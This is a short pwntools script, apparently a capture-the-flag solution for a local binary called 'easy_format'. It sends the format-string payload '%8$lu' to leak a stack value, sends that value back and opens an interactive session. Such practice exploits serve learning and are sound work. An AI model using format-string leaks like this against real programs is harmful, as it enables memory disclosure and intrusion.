from pwn import *

p=process('./easy_format')
elf=ELF('./easy_format')
p.sendline(b'%8$lu')
r=p.recv().decode()
sec=int(r[7:-1])
print(r)
p.sendline(str(sec))
# payload=
r=p.recv()
print(r.decode())
p.interactive()